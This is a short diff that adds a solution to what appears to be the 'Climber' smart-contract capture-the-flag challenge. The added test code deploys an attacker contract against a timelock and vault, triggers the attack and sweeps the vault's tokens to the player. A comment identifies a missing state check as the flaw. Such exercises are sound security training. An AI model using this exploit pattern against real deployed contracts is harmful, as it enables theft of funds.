@@ -58,6 +58,14 @@ describe('[Challenge] Climber', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const climberVaultAttacker = await (
+            await ethers.getContractFactory('ClimberVaultAttacker', player)
+        ).deploy(timelock.address, vault.address);
+
+        await climberVaultAttacker.connect(player).attack();
+        await vault.connect(player).sweepFunds(token.address);
+
+        //Should check OperationState is ReadyForExecution before perform external call
     });
 
     after(async function () {
